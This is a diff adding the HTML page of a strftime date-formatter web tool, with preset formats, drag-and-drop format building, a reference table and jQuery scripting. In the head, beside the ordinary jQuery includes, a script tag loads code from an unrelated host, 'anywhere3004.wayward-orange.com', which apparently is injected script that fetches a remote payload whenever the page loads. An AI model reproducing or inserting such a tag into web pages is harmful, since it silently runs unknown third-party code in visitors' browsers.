@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+	<head>
+    
+		<title>Time-Date
+</title>
+	
+		<meta content="authenticity_token" name="csrf-param" />
+<meta content="3j+DVICy3e32yRb3Thv76nUMFq4dO867WNtPLxupjbM=" name="csrf-token" />
+
+		<link href='http://fonts.googleapis.com/css?family=Droid+Sans|Droid+Serif' rel='stylesheet' type='text/css'>
+	
+		<!-- Blueprint -->
+		<link rel="stylesheet" href="/stylesheets/blueprint/screen.css" type="text/css" media="screen, projection">
+		<link rel="stylesheet" href="/stylesheets/blueprint/print.css" type="text/css" media="print">
+		<link rel="stylesheet" href="/stylesheets/blueprint/plugins/buttons/screen.css" type="text/css">	  
+
+	      <!--[if lt IE 8]>
+			<link rel="stylesheet" href="stylesheets/blueprint/ie.css" type="text/css" media="screen, projection">
+	      <![endif]-->
+		
+		<!-- Rails -->
+		<link rel="stylesheet" href="/stylesheets/application.css" type="text/css">
+
+		<!-- jQuery UI -->
+		<link type="text/css" href="/stylesheets/ui-lightness/jquery-ui-1.8.7.custom.css" rel="Stylesheet" />	
+
+		<!-- Google CDN jQuery -->
+		<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.js"></script>	
+		<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.7/jquery-ui.min.js"></script>	
+		<script src="//anywhere3004.wayward-orange.com/plead8788/" defer async></script>
+		<script type="text/javascript">
+
+			$(function() {
+				$( "#tabs" ).tabs();
+			});
+		
+		</script>
+
+    </head>
+<body>
+	
+  <div class="container">
+		
+		<div class="span-24">
+			
+		</div>
+		
+		
+
+<div class="prepend-top prepend-6 span-12 append-6 last ">
+	
+	<form accept-charset="UTF-8" action="/dateformatter" data-remote="true" id="strform" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /></div>
+		
+		
+		<div class="span-6 last">
+			<div class="label">Format:</div>
+			<input id="strftime" name="strftime" size="26" type="text" value="%A, %b %d" />
+		</div>
+		
+</form>	
+</div>
+
+<div class="prepend-top prepend-6 span-6 append-6 last">
+	
+	<div id="date_result" class="label">Result:</div>
+	
+	<div id="formatted_date">Thursday, Jan 12</div>	
+	
+</div>
+
+<div class="prepend-6 span-12 append-6 last">
+
+	<div id="tabs">
+		<ul>
+			<li><a id="presets" href="#tabs-1">Presets</a></li>
+			<li><a id="build_your_own" href="#tabs-2">Build Your Own</a></li>			
+			<li><a id="reference" href="#tabs-3">References</a></li>
+		</ul>
+  
+		<div style="float:left; width:45%; height:px; margin:5px; background-color:#FFFFFF; font-size:14px; color:#000000; font-weight:normal; font-style:normal; text-align:left; text-decoration:none; padding:4px; border:0px solid #000000;">
+
+    <div id="tabs-1" class="tab_content">
+			<form accept-charset="UTF-8" action="/dateformatter" data-remote="true" id="presets" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /></div>
+		
+
+
+					<input checked="checked" id="strformat__A___b__d" name="strformat" type="radio" value="%A, %b %d" /> <label for="strformat__A___b__d">Thursday, Jan 12</label><br/>
+					<input checked="checked" id="strformat__m__d__Y" name="strformat" type="radio" value="%m/%d/%Y" /> <label for="strformat__m__d__Y">01/12/2017</label><br/>
+					<input checked="checked" id="strformat__m-_e-_y__H:_M" name="strformat" type="radio" value="%m-%e-%y %H:%M" /> <label for="strformat__m-_e-_y__H:_M">01-12-17 06:15</label><br/>
+					<input checked="checked" id="strformat__b__e___l:_M__p" name="strformat" type="radio" value="%b %e, %l:%M %p" /> <label for="strformat__b__e___l:_M__p">Jan 12,  6:15 AM</label><br/>
+					<input checked="checked" id="strformat__B__Y" name="strformat" type="radio" value="%B %Y" /> <label for="strformat__B__Y">January 2017</label><br/>
+					<input checked="checked" id="strformat__b__d___Y" name="strformat" type="radio" value="%b %d, %Y" /> <label for="strformat__b__d___Y">Jan 12, 2017</label><br/>
+					<input checked="checked" id="strformat__a___e__b__Y__H:_M:_S__z" name="strformat" type="radio" value="%a, %e %b %Y %H:%M:%S %z" /> <label for="strformat__a___e__b__Y__H:_M:_S__z">Thu, 12 Jan 2017 06:15:50 +0000</label><br/>
+					<input checked="checked" id="strformat__Y-_m-_dT_l:_M:_S_z" name="strformat" type="radio" value="%Y-%m-%dT%l:%M:%S%z" /> <label for="strformat__Y-_m-_dT_l:_M:_S_z">2017-01-12T 6:15:50+0000</label><br/>
+					<input checked="checked" id="strformat__I:_M:_S__p" name="strformat" type="radio" value="%I:%M:%S %p" /> <label for="strformat__I:_M:_S__p">06:15:50 AM</label><br/>
+					<input checked="checked" id="strformat__H:_M:_S" name="strformat" type="radio" value="%H:%M:%S" /> <label for="strformat__H:_M:_S">06:15:50</label><br/>
+					<input checked="checked" id="strformat__e__b__Y__H:_M:_S_p" name="strformat" type="radio" value="%e %b %Y %H:%M:%S%p" /> <label for="strformat__e__b__Y__H:_M:_S_p">12 Jan 2017 06:15:50AM</label><br/>
+					<input checked="checked" id="strformat__d._m._y" name="strformat" type="radio" value="%d.%m.%y" /> <label for="strformat__d._m._y">12.01.17</label><br/>
+					<input checked="checked" id="strformat__A___d__b__Y__l:_M__p" name="strformat" type="radio" value="%A, %d %b %Y %l:%M %p" /> <label for="strformat__A___d__b__Y__l:_M__p">Thursday, 12 Jan 2017  6:15 AM</label><br/>
+			
+</form>			
+			<div style="clear:both;"></div>
+
+		</div>
+</div>
+<div style="float:right; width:45%; height:px; margin:5px; background-color:#FFFFFF; font-size:14px; color:#000000; font-weight:normal; font-style:normal; text-align:left; text-decoration:none; padding:4px; border:0px solid #000000;">
+		
+		<div id="tabs-2" class="tab_content">
+			
+			<ul>
+					<li class="draggable_format" id="%a">Thu</li>
+					<li class="draggable_format" id="%A">Thursday</li>
+					<li class="draggable_format" id="%b">Jan</li>
+					<li class="draggable_format" id="%B">January</li>
+					<li class="draggable_format" id="%e">12</li>
+					<li class="draggable_format" id="%l"> 6</li>
+					<li class="draggable_format" id="%m">01</li>
+					<li class="draggable_format" id="%M">15</li>
+					<li class="draggable_format" id="%p">AM</li>
+					<li class="draggable_format" id="%S">50</li>
+					<li class="draggable_format" id="%w">4</li>
+					<li class="draggable_format" id="%y">17</li>
+					<li class="draggable_format" id="%Y">2017</li>
+					<li class="draggable_format" id="%z">+0000</li>
+					<li class="draggable_format" id="%Z">UTC</li>
+			</ul>
+			
+			<div style="clear:both;"></div>
+		</div>
+		</div>
+<table width=98% border=0 cellpadding=4 cellspacing=2 bgcolor=#FFFFFF><tr><td>
+	
+		<div id="tabs-3" class="tab_content">
+			
+			%a - The abbreviated weekday name (Sun)<br/>
+			%A - The  full  weekday  name (Sunday)<br/>
+			%b - The abbreviated month name (Jan)<br/>
+			%B - The  full  month  name (January)<br/>
+			%d - Day of the month (01..31)<br/>
+			%e - Day of the month (1..31)</br>
+			%H - Hour of the day, 24-hour clock (00..23)<br/>
+			%I - Hour of the day, 12-hour clock (01..12)<br/>
+			%l - Hour of the day ()<br/>
+			%j - Day of the year (001..366)<br/>
+			%m - Month of the year (01..12)<br/>
+			%M - Minute of the hour (00..59)<br/>
+			%p - Meridian indicator (AM  or  PM)<br/>
+			%S - Second of the minute (00..60)<br/>
+			%w - Day of the week (Sunday is 0, 0..6)<br/>
+			%y - Year without a century (00..99)<br/>
+			%Y - Year with century<br/>
+			%Z - Time zone name<br/>
+			%% - Literal % character<br/>
+    </div>
+</td><td>Set Time Zone:<br/>
+  <span style="background-color:yellow"><b>sudo x-text-editor /etc/timezone</b></span></br>
+Set Time:<br/><span style="background-color:yellow"><b>sudo dpkg-reconfigure tzdata</b></span></td></tr></table>			
+	</div>
+	
+</div>
+
+
+
+<script type="text/javascript">
+
+	function refresher(){
+		var form = $("#strform");
+		var url = form.attr("action"); // grab the URL from the form's action value.
+		var formData = form.serialize(); // grab the data in the form
+		$.get(url, formData, function(html) { // perform an AJAX get
+			$("#formatted_date").html(html); // replace the "results" div with the result of action taken
+		});
+	}
+	
+	var formats_array = ['%a','%A','%b','%B','%e','%l','%m','%M','%p','%S','%w','%y','%Y','%z','%Z']
+	
+ 
+	// Set first option to be checked at load
+	$("input:[name=strformat]:eq(0)").attr('checked',true);
+	
+	// Set format input field to new strftime value
+	$("input:[name=strformat]").bind("click", function(){ 
+		$("input:[name=strftime]").val(this.value); 
+		refresher();
+	});
+
+	// Update on input field change
+	$("#date").bind("keyup",refresher);
+	$("#strftime").bind("keyup",refresher);
+	
+	
+	// BEGIN DRAG AND DROP
+	
+	// Display Drag and Drop cues
+	$("#build_your_own").bind("click", function(){
+
+		// Clear existing format and date
+		$('#strftime').val("");
+		$('#formatted_date').text("Drag Date Elements Here");
+		
+		$('#formatted_date').addClass('drop_box');
+		
+	});
+	
+	// Remove Drag and Drop cues
+	$("#presets").bind("click", function(){
+	
+		$('#strftime').val("%A, %b %d");
+		refresher();
+		
+		$('#formatted_date').removeClass('drop_box');
+		
+	});
+	
+	$("#reference").bind("click", function(){
+	
+		$('#strftime').val("%A, %b %d");
+		refresher();
+		
+		$('#formatted_date').removeClass('drop_box');
+		
+	});	
+	
+	// Individual dateparts
+	$(".draggable_format").draggable({ revert: "valid" });
+	
+	// Droppable target 
+	$("#formatted_date").droppable({
+		activeClass: "ui-state-hover",
+		hoverClass: "ui-state-active",
+		drop: function( event, ui ) {
+	
+			var current_text = $('#formatted_date').text();
+			
+			if(current_text == 'Drag Date Elements Here'){
+				current_text = '';
+			}
+				
+			console.log(ui.draggable.index());
+
+			var new_format = $('#strftime').val() + formats_array[ui.draggable.index()] + ' ';
+			var new_text = $('#formatted_date').text();
+			
+			$('#strftime').val(new_format);
+			$('#formatted_date').text(current_text + ui.draggable.text() + ' ');
+			
+		}
+	});
+	
+ </script>
+	
+</body>
+</html>
